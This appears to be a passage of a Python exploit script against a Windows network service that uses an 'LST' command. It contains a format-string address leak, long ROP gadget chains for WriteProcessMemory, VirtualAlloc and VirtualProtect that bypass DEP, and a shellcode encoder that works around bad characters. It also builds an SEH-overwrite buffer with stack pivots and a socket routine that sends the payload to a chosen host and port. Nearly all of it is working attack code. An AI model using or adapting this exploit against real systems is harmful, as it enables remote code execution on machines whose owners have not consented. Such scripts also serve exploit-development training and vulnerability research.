            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;
            # Copy value to EDI additionally for future use
            intbasemain + 0x48ca8,                  # xchg eax, edi ; ret ;

            ### hProcess; Process handle == current process ###
            # Skip this ROP skel argument
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x7609f,                  # add eax, 0x04 ; ret ;
            intbasemain + 0x7609f,                  # add eax, 0x04 ; ret ;
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler

            ### lpBaseAddress; start of codecave address to write to, .text   # ropskelcodecave ###
            # intbasemain + 0x8fb00
            # Copy previously stored value in EDI to EAX
            intbasemain + 0x48ca8,                  # xchg eax, edi ; ret ;
            # Copy dereferenced value in EDX
            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;

            ### lpBuffer; Code to be copied         # ropskelscSrc ###
            # Move to next ROP skel argument
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x7609f,                  # add eax, 0x04 ; ret ;
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Restore former ESP value stored in ESI for calculations
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x86751,                  # or eax, esi ; pop esi ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Use add method for EAX to calculate offset to shellcode offset
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            0x88888888,                             # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            Helpers.addhex(ropskelscSrc),           # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x353cf,                  # add eax, 0x10 ; ret ;
            intbasemain + 0x353cf,                  # add eax, 0x10 ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Copy dereferenced value in EDX
            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;

            ### nsize ###
            # Move to next ROP skel argument
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x7609f,                  # add eax, 0x04 ; ret ;
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Calculate value by adding using existing instruction
            intbasemain + 0x87111,                  # mov eax, 0x00000400 ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            # Copy dereferenced value in EDX
            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;

            ### *lpNumberOfBytesWritten             # offsetwritable ###
            # intbasemain + 0xa932c
            # Move to next ROP skel argument
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x7609f,                  # add eax, 0x04 ; ret ;
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
             # Calculate value by negating
            intbasemain + 0x4cc17,                  # pop eax ; ret ;
            (-(intbasemain + 0xa932c)) & 0xffffffff,
            intbasemain + 0x31630,                  # neg eax ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            # Copy dereferenced value in EDX
            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;

            ### Align stack for function execution
            # Save current ESP in EAX
            intbasemain + 0x54ff6,                  # pop eax ; ret ;
            (-(intbasemain + offsetwritable)) & 0xffffffff,           # Found by !dh and adding virtual size and virtual offset to main binary
            intbasemain + 0x31630,                  # neg eax ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x683da,                  # push esp ; add  [eax], eax ; pop ecx ; ret ;
            intbasemain + 0x1778a,                  # mov eax, ecx ; ret ;
            # Addhex method
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            0x88888888,                             # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            Helpers.addhex(ropskelAlign),           # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Switch execution from EAX to ESP
            intbasemain + 0x66ab3,                  # xchg eax, esp ; ret ;
        ]
        return rop_chain1_gadgets

    def chainVirtualAlloc(intbasemain,offsetwritable,offsetk32heapfree,offsetk32va,ropskelfuncOffset,ropskelscOffset,ropskeleaxscOffset):
        rop_chain1_gadgets = [
            ### Future usage ###
            # Clear ESI for future usage
            intbasemain + 0x6219f,                  # xor edx, edx ; ret ;
            intbasemain + 0x33152,                  # mov edi, edx ; ret ;
            intbasemain + 0x39ece,                  # or esi, edi ; ret

            ### ESP Alignment ###
            # Save current ESP in EAX
            intbasemain + 0x54ff6,                  # pop eax ; ret ;
            intbasemain + offsetwritable,           # Found by !dh and adding virtual size and virtual offset to main binary
            intbasemain + 0x683da,                  # push esp ; add  [eax], eax ; pop ecx ; ret ;
            intbasemain + 0x1778a,                  # mov eax, ecx ; ret ;
            # Save to ESI as well
            intbasemain + 0x32bf4,                  # add esi, eax ; inc ecx ; add al, 0x00 ; pop edi ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Use add method for EAX to calculate offset to ROP skeleton
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            0x88888888,                             # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            Helpers.addhex(ropskelfuncOffset),      # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler

            ### Dereference PTR for VirtualAlloc address ###
            # In this case, it's the KERNEL32!HeapFreeStub function
            intbasemain + 0x6f242,                  # pop eax ; ret ;
            (-(intbasemain + offsetk32heapfree)) & 0xffffffff,
            intbasemain + 0x31630,                  # neg eax ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x2bb8e,                  # mov eax,  [eax] ; ret ;
            # Use add method for EAX to calculate offset to KERNEL32!VirtualAllocStub
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            0x88888888,                             # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            Helpers.addhex(offsetk32va),            # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Copy dereferenced value in EDX
            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;

            ### Shellcode ret address ###
            # Move to next ROP skel argument
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x7609f,                  # add eax, 0x04 ; ret ;
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Restore former ESP value stored in ESI for calculations
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x86751,                  # or eax, esi ; pop esi ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Use add method for EAX to calculate offset to shellcode offset
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            0x88888888,                             # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8ea82,                  # pop ecx ; ret ;
            Helpers.addhex(ropskelscOffset),        # Value to add
            intbasemain + 0x17781,                  # add eax, ecx ; pop ebp ; retn 0x0004 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Copy dereferenced value in EDX
            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;
            # Copy value to EDI additionally for future use
            intbasemain + 0x48ca8,                  # xchg eax, edi ; ret ;
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x113a8,                  # add eax, edi ; ret ;

            ### lpAddress; same as above ###
            # Move to next ROP skel argument
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x7609f,                  # add eax, 0x04 ; ret ;
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Copy dereferenced value in EDX
            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;

            ### dwSize == 0x1 ###
            # Move to next ROP skel argument
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x7609f,                  # add eax, 0x04 ; ret ;
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Calculate value by negating
            intbasemain + 0x4cc17,                  # pop eax ; ret ;
            (-(0x1)) & 0xffffffff,
            intbasemain + 0x31630,                  # neg eax ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            # Copy dereferenced value in EDX
            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;

            ### flAllocationType == 0x1000 ###
             # Move to next ROP skel argument
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x7609f,                  # add eax, 0x04 ; ret ;
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
             # Calculate value by negating
            intbasemain + 0x4cc17,                  # pop eax ; ret ;
            (-(0xf81)) & 0xffffffff,                # 0xf81+0x7f == 0x1000
            intbasemain + 0x31630,                  # neg eax ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x62646,                  # add eax, 0x7F ; ret ;
            # Copy dereferenced value in EDX
            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;

            ### flProtect == 0x40 ###
            # Move to next ROP skel argument
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x71489,                  # xor eax, eax ; ret ;
            intbasemain + 0x7609f,                  # add eax, 0x04 ; ret ;
            intbasemain + 0x113a4,                  # xchg eax, ebx ; ret ;
            intbasemain + 0x316ae,                  # add edx, ebx ; pop ebx ; retn 0x0010 ;
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            intbasemain + 0x8f7d5,                  # RET filler
            # Calculate value by negating
            intbasemain + 0x4cc17,                  # pop eax ; ret ;
            (-(0x40)) & 0xffffffff,
            intbasemain + 0x31630,                  # neg eax ; pop ebp ; ret ;
            intbasemain + 0x8f7d5,                  # RET filler
            # Copy dereferenced value in EDX
            intbasemain + 0x4bfa0,                  # mov  [edx], eax ; ret ;

            ### Align EAX with shellcode ###
            # Copy previously stored value in EDI to EAX
            intbasemain + 0x48ca8,                  # xchg eax, edi ; ret ;


        ]
        return rop_chain1_gadgets

    def chainVirtualProtect(intbasemain,intptrk32vp,ropskelfuncOffset,ropskelscOffset,ropskeloldProtect,ropskeleaxscOffset):
        rop_chain1_gadgets = [
            ### ESP Alignment ###
            # Save current ESP in xxx
            intbasemain + 0x0,
            # Use add method for EAX to calculate offset
            intbasemain + 0x2b38,                   # pop ecx ; ret ;
            0x88888888,                             # Value to add
            intbasemain + 0x9b36,                   # add eax, ecx ; pop ebx ; ret ;
            0x69696969,                             # Filler
            intbasemain + 0x2b38,                   # pop ecx ; ret ;
            Helpers.addhex(ropskelfuncOffset),      # Value to add
            intbasemain + 0x9b36,                   # add eax, ecx ; pop ebx ; ret ;
            0x69696969,                             # Filler
            intbasemain + 0x1e73,                   # mov ebx, eax ; ret ;
            ### VirtualProtect address ###
            intbasemain + 0x2b37,                   # pop eax ; pop ecx ; ret ;
            intptrk32vp,
            0x69696969,                             # Filler
            intbasemain + 0x1e6c,                   # mov eax,  [eax] ; add ecx, 0x05 ; pop edx ; ret ;
            0x69696969,                             # Filler
            intbasemain + 0x1e7a,                   # mov  [ebx], eax ; ret ;

            ### Shellcode ret address ###
            # Exchange EBX for EDX to save value; copy to EAX for calculations
            intbasemain + 0x1e7d,                   # xchg edx, ebx ; cmp ebx, eax ; ret ;
            intbasemain + 0x2cec,                   # mov eax, edx ; ret ;
            # Add method
            intbasemain + 0x2b38,                   # pop ecx ; ret ;
            0x88888888,                             # Value to add
            intbasemain + 0x9b36,                   # add eax, ecx ; pop ebx ; ret ;
            0x69696969,                             # Filler
            intbasemain + 0x2b38,                   # pop ecx ; ret ;
            Helpers.addhex(ropskelscOffset),        # Value to add
            intbasemain + 0x9b36,                   # add eax, ecx ; pop ebx ; ret ;
            0x69696969,                             # Filler
            # Restore EBX
            intbasemain + 0x1e7d,                   # xchg edx, ebx ; cmp ebx, eax ; ret ;
            intbasemain + 0x1e82,                   # add ebx, 0x04 ; ret  ;
            intbasemain + 0x1e7a,                   # mov  [ebx], eax ; ret ;

            ### lpAddress; same as above ###
            intbasemain + 0x1e82,                   # add ebx, 0x04 ; ret  ;
            intbasemain + 0x1e7a,                   # mov  [ebx], eax ; ret ;

            ### dwSize ###
            intbasemain + 0x1e82,                   # add ebx, 0x04 ; ret  ;
            # N/A

            ### flNewProtect ###
            intbasemain + 0x1e82,                   # add ebx, 0x04 ; ret  ;
            # N/A

            ### lpflOldProtect ###
            intbasemain + 0x2b37,                   # pop eax ; pop ecx ; ret ;
            intbasemain + 0xf110,                   # Writeable address
            0x69696969,                             # Filler
            intbasemain + 0x1e82,                   # add ebx, 0x04 ; ret  ;
            intbasemain + 0x1e7a,                   # mov  [ebx], eax ; ret ;
            intbasemain + 0x1e7d,                   # xchg edx, ebx ; cmp ebx, eax ; ret ;
            intbasemain + 0x2cec,                   # mov eax, edx ; ret ;

            # Align EAX with shellcode
            intbasemain + 0x2b38,                   # pop ecx ; ret ;
            0x88888888,                             # Value to add
            intbasemain + 0x9b36,                   # add eax, ecx ; pop ebx ; ret ;
            0x69696969,                             # Filler
            intbasemain + 0x2b38,                   # pop ecx ; ret ;
            Helpers.addhex(ropskeleaxscOffset),
            intbasemain + 0x9b36,                   # add eax, ecx ; pop ebx ; ret ;
            0x69696969,                             # Filler
            intbasemain + 0x344d,                   # xchg eax, esp ; ret ;
        ]
        return rop_chain1_gadgets

class Network:
    def create_tcp(host,port):
        sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock_tcp.connect((host, port))
        return sock_tcp

    def sendrecv(host,port,recv,recvsize,buffer):
        try:
            print("Sending buffer...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.send(buffer)
            if recv:
                response = s.recv(recvsize)
                s.close()
                return response
            else:
                s.close()
                return False
        except Exception:
            traceback.print_exc()
            sys.exit(0)
        except KeyboardInterrupt:
            Helpers.keyboard_interrupt()

    def send(host,port,recv,recvsize,buffer):
        try:
            print("Sending buffer...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            s.send(buffer)
            s.close()
        except Exception:
            traceback.print_exc()
            sys.exit(0)
        except KeyboardInterrupt:
            Helpers.keyboard_interrupt()

class Payload:
    def leakAddr():
        # Offsets
        offsetstack = 0x3
        offsetbase = 0x14120

        # Lines
        folder = b"%x:%x:%x:%x"
        lstcmd = b"LST " + folder

        # Building buffer
        buffer = b""
        buffer += lstcmd

        # Send buffer
        resp = Network.sendrecv(host, port, True,1024,buffer)
        values = resp.split(b":")
        stackaddr = int(values[offsetstack],16) - offsetbase

        return stackaddr

    def crashAppl(leakedaddr,ropskel,ropchainwpm,ropchaindecoder,ropchainalign,shellcode):
        # Lengths
        lentotal = 0x1000
        lenbufbeforepivot = 0x0

         # Offsets
        offsetskel = 0x4
        offsetlanding = 0x78 # 0x74
        offsetcrash = 0x40c

        # RET NOP sled
        retnop = pack("<I",leakedaddr + 0x8f7d5)                            # ret ;
        retnopsledsmall = retnop * 0x8

        # Regular NOP sled
        nopsled = b"\x90" * 0x10

        # Stackpivots
        stackpivot1 = pack("<I", leakedaddr + 0x1139d)                      # add esp, 0x00000D60 ; ret ;
        stackpivot2 = pack("<I", leakedaddr + 0x77d3a)                      # add esp, 0x1C ; ret ;

        # Lines
        lstcmd = b"LST "

        # Building buffer
        buffer = b""
        buffer += lstcmd
        buffer += ropskel
        buffer += retnop * 0x18
        buffer += ropchainalign
        buffer += ropchaindecoder
        buffer += retnop * int((offsetcrash - len(buffer) - len(stackpivot2))/4)        # Skip near offsetcrash to minimise stackpivot2 length requirement
        buffer += stackpivot2                                                           # Jump over next buffer and NSEH/SEH
        # print(hex(len(buffer)))                                                         # To debug if buffer before crash isn't longer than offsetcrash
        lenbufbeforepivot = len(buffer)
        buffer += b"C" * (offsetcrash - len(buffer))
        buffer += b"D" * 0x4                                                            # NSEH
        buffer += stackpivot1                                                           # SEH
        buffer += retnopsledsmall                                                       # Landing pad after second stack pivot
        buffer += ropchainwpm
        buffer += nopsled
        buffer += shellcode
        buffer += b"F" * (lentotal - len(buffer))

        # Check if buffer before stackpivot isn't too big
        if lenbufbeforepivot > offsetcrash:
            print("[!] Payload before stackpivot too big: too big payload and/or too many ROP decoder instructions, exiting...\n")
            exit(0)

        # Send buffer
        resp = Network.sendrecv(host, port, True,1024,buffer)
        return resp

# Main
def main(argv):
    parser = argparse.ArgumentParser(description='Network POC')
    parser.add_argument("--host", "-i", required=True, help="The host of the target.")
    parser.add_argument("--port", "-p", required=True, help="The port of the target")
    args = parser.parse_args()

    # Globals
    global host, port
    global gsock

    # Vars
    host = args.host
    port = args.port

    ### ADD VARS HERE ###
    intmainbaseaddr = 0x0
    lenbadscchars = 0x0
    lenropdecoder = 0x0
    lenbadscchars = 0x0

    # Offset to main library
    offsetk32heapfree = 0x90178
    offsetk32wpm = 0x2e7b0
    offsetwritable = 0xa9390

    # Offsets for encoding/decoding shellcode bad chars
    offsetEncoding = 0x44
    offsetDecoding = -offsetEncoding

    # ROP offset var initialize
    ropskelfuncOffset = 0x0
    ropskelscSrc = 0x0
    ropskeleaxscOffset = 0x0
    ropskelalign = 0x0

    ### SHELLCODE CHECKS AND COLORS ###
    print(Colors.BOLD + "[*] SHELLCODE BAD CHAR MAPPING AND ENCODING\n" + Colors.END)
    # Shellcode select
    shellcode = Shellcode.msfShellcodeCalc()
    # Program bad chars
    Badchars.programbadchars = badchars
    # Check shellcode and map bad characters
    Shellcode.mappedbadscchars = Helpers.mapBadChars(shellcode)
    # Encode shellcode
    Shellcode.encodedShellcode,Shellcode.encodedShellcodeHex = Helpers.encodeShellcode(shellcode,offsetEncoding)
    # Color characters for both original bad and encoded chars
    originalsc = Helpers.convertPrettyHex(shellcode)
    encodedsc = Shellcode.encodedShellcodeHex
    coloredoriginalsc,coloredencodedsc = Helpers.colorBadbytes(originalsc,encodedsc)
    print("Original shellcode: \n" + coloredoriginalsc)
    print("Encoded shellcode: \n" + coloredencodedsc)

    # Variable and ROP parameter lengths
    print(Colors.BOLD + "[*] BUFFER VARS\n" + Colors.END)
    lenbadscchars = len(Shellcode.mappedbadscchars)
    print("[*] Length badchars SC    " + str(lenbadscchars) + " / " + str(hex(lenbadscchars)))
    lenropchainwpm = len(ROP.chainWriteProcessMemory(intmainbaseaddr,offsetwritable,offsetk32heapfree,offsetk32wpm,ropskelfuncOffset,ropskelscSrc,ropskelalign)*4)
    lenropdecoder = len(ROP.chainDecoder(intmainbaseaddr,shellcode,offsetDecoding)*4)
    lenropalign = len(ROP.chainAlign(intmainbaseaddr,offsetwritable,ropskeleaxscOffset)*4)
    print("[*] Length ROP chain WPM: " + str(lenropchainwpm) + " / " + str(hex(lenropchainwpm)))
    print("[*] Length ROP decoder:   " + str(lenropdecoder) + " / " + str(hex(lenropdecoder)))
    print("[*] Length ROP align:     " + str(lenropalign) + " / " + str(hex(lenropalign)))

    try:
        ### LEAK ADDRESSES ###
        print(Colors.BOLD + "\n[*] LEAKING ADDRESSES...\n" + Colors.END)
        intmainbaseaddr = Payload.leakAddr()
        print("[i] Baseaddress of main binary is " + hex(intmainbaseaddr))
        intptrk32heapfree = intmainbaseaddr + offsetk32heapfree
        print("[*] Calculated PTR offset to Kernel32!HeapFreeStub is " + hex(intptrk32heapfree))

        # ROP offset vars
        ropskeleaxscOffset = 0x5fc
        ropskelfuncOffset = -0x75c
        ropskelscSrc = -0xe0
        ropskelalign = -0x654

        ### ROP ###
        ropskelwpm_gadgets = ROP.wpmSkeleton()
        ropskelwpm = b''.join(pack('<L',_) for _ in ropskelwpm_gadgets)
        ropchainalign_gadgets = ROP.chainAlign(intmainbaseaddr,offsetwritable,ropskeleaxscOffset)
        ropchainalign = b''.join(pack('<L',_) for _ in ropchainalign_gadgets)
        ropchaindecoder_gadgets = ROP.chainDecoder(intmainbaseaddr,shellcode,offsetDecoding)
        ropchaindecoder = b''.join(pack('<L',_) for _ in ropchaindecoder_gadgets)
        ropchainwpm_gadgets = ROP.chainWriteProcessMemory(intmainbaseaddr,offsetwritable,offsetk32heapfree,offsetk32wpm,ropskelfuncOffset,ropskelscSrc,ropskelalign)
        ropchainwpm = b''.join(pack('<L',_) for _ in ropchainwpm_gadgets)

        ### ROP CHECK FOR BADCHARS ###
        # Add all gadgets to chain to check for badchars
        check_badchar_ropchains = [
            ropskelwpm_gadgets,
            ropchainalign_gadgets,
            ropchaindecoder_gadgets,
            ropchainwpm_gadgets,
        ]

        # DEBUG ROP CHAINS
        #for rop in ropchainwpm_gadgets:
        #    print(hex(rop))

        # Check ROP for bad characters
        print(Colors.BOLD + "\n[*] CHECKING ROP CHAINS..." + Colors.END)
        for chain in check_badchar_ropchains:
            chainname = [key for key, value in locals().items() if value == chain]
            print(Colors.BOLD + "[*] " + chainname[0] + Colors.END)
            for rop in chain:
                hexRop = Helpers.toByteHex(hex(rop))
                checkhalf = None
                if Helpers.containsBadchars(hexRop, checkhalf):
                    print("[!] Bad character in ROP chain")
                    exit(-1)

        ### CRASH / EIP OVERWRITE FUNCTION HERE ###
        # Send EIP/CRASH
        print(Colors.BOLD + "\n[*] SENDING PAYLOAD POC...\n" + Colors.END)
        Payload.crashAppl(intmainbaseaddr,ropskelwpm,ropchainwpm,ropchaindecoder,ropchainalign, Shellcode.encodedShellcode)

    except Exception:
        traceback.print_exc()
        sys.exit(0)
    except KeyboardInterrupt:
        Helpers.keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])

